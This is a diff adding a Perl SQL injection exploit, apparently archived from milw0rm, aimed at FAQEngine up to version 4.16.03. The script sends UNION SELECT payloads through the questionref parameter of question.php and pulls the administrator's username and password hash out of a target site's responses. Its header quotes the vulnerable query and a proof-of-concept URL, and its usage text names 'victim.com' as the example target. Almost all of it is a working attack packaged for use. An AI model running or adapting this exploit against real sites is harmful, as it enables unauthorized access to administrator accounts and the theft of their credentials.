@@ -1,0 +1,90 @@
+#!/usr/bin/perl -w
+
+#################################################################################
+#										#
+#	            FAQEngine <= v4.16.03 SQL Injection Exploit			#
+#										#
+# Discovered by: Silentz							#
+# Payload: Admin Username & Hash Retrieval					#
+# Website: http://www.w4ck1ng.com						#
+# 										#
+# Vulnerable Code (question.php):						#
+#										#
+#      $sql = "select * from ".$tableprefix."_questions where publish=1 	#
+#      and questionref=$questionref order by enterdate desc";			#
+#										#
+# PoC: question.php?mode=display&questionref=-999 UNION SELECT 0,0,0,0,		#
+#      username,password,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*	#
+# 										#
+# Subject To: The question display mode being enabled				#
+# GoogleDork: Get your own!							#
+#										#
+# Shoutz: The entire w4ck1ng community						#
+#										#
+#################################################################################
+
+use LWP::UserAgent;
+
+if (@ARGV < 1){
+print "-------------------------------------------------------------------------\r\n";
+print "                 FAQEngine <= v4.16.03 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: w4ck1ng_faqengine.pl [PATH]\r\n\r\n";
+print "[PATH] = Path where FAQEngine is located\r\n\r\n";
+print "e.g. w4ck1ng_faqengine.pl http://victim.com/faq/\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+exit();
+}
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+
+@paths = (
+"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,username,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*",
+"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,username,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*",
+"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,username,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*"
+);
+
+for($i=0;$i<3;$i++){
+  $host = $ARGV[0] . $paths[$i];
+  $res = $b->request(HTTP::Request->new(GET=>$host));
+  ($user) = $res->content =~ /">([0-9a-zA-Z]+)<\/span><\/td><\/tr>/;
+
+  if($user){ last; }
+}
+
+if($user){
+  print "-------------------------------------------------------------------------\r\n";
+  print "                 FAQEngine <= v4.16.03 SQL Injection Exploit\r\n";
+  print "-------------------------------------------------------------------------\r\n";
+  print "[+] Admin User : $user\n";
+}
+
+
+@paths = (
+"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,password,0,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*",
+"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,password,0,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*",
+"question.php?mode=display&lang=en&questionref=-999 UNION SELECT 0,0,0,0,0,password,0,0,0,0,0,0,0,0,0 FROM faq_admins WHERE usernr=1 /*"
+);
+
+for($i=0;$i<3;$i++){
+  $host = $ARGV[0] . $paths[$i];
+  $res = $b->request(HTTP::Request->new(GET=>$host));
+  ($hash) = $res->content =~ /([0-9a-fA-F]{32})/;
+  if($hash){ last; }
+}
+
+if($hash){
+  print "[+] Admin Hash : $hash\n";
+  print "-------------------------------------------------------------------------\r\n";
+  print "            		 http://www.w4ck1ng.com\r\n";
+  print "            		        ...Silentz\r\n";
+  print "-------------------------------------------------------------------------\r\n";
+} else {
+  print "\nExploit Failed...\n";
+}
+
+# milw0rm.com [2007-05-16]
